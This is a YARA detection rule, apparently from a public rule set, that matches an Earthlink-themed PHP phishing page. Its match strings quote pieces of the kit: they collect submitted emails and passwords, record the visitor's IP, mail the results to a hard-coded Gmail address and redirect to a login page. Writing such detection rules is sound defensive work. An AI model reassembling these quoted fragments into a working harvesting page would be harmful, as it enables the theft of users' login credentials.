rule infected_09_30_18_earthlink_phish_index {
  meta:
    description = "phish - file index.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2018-09-30"
    hash1       = "fb94a67c38e4564efc164df7608959de76c8c47428db9515fb434957a8a3ce05"

  strings:
    $s1  = "$message .= \"Pass.::::::::::::::: \".$_POST['password'].\"\\n\";" fullword ascii
    $s2  = "header(\"Location: login.htm\");" fullword ascii
    $s3  = "$message .= \"--------------Earthlink Smtp Rezultat-----------------------\\n\";" fullword ascii
    $s4  = "$recipient =\"aheithaway@gmail.com\";" fullword ascii
    $s5  = "$message .= \"Email.::::::::::::: \".$_POST['email'].\"\\n\";" fullword ascii
    $s6  = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
    $s7  = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
    $s8  = "$subject = \"Earthlink Smtp ReZulT\";" fullword ascii
    $s9  = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
    $s10 = "echo \"ERROR! Please go back and try again.\";" fullword ascii
    $s11 = "{$carca = mail($recipient,$subject,$message,$headers);}" fullword ascii
    $s12 = "$message .= \"---------------Re-Modified By nONE-------\\n\";" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 2KB and
      (8 of them)
    ) or (all of them)
}